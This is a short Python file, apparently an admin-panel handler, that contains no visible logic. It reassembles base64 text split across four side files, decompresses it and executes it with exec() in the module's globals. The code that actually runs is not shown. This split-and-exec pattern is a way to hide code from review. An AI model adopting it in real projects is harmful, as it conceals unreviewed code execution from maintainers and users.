# handlers/admin_panel.py — self-contained from line-split b64 parts
import zlib, base64
from pathlib import Path
_dir = Path(__file__).resolve().parent
parts = []
for i in range(4):
    parts.append((_dir / f"eb{i}_ml.txt").read_text())
_b = "".join("".join(p.split()) for p in parts)
_code = zlib.decompress(base64.b64decode(_b)).decode("utf-8")
exec(compile(_code, __file__, "exec"), globals())
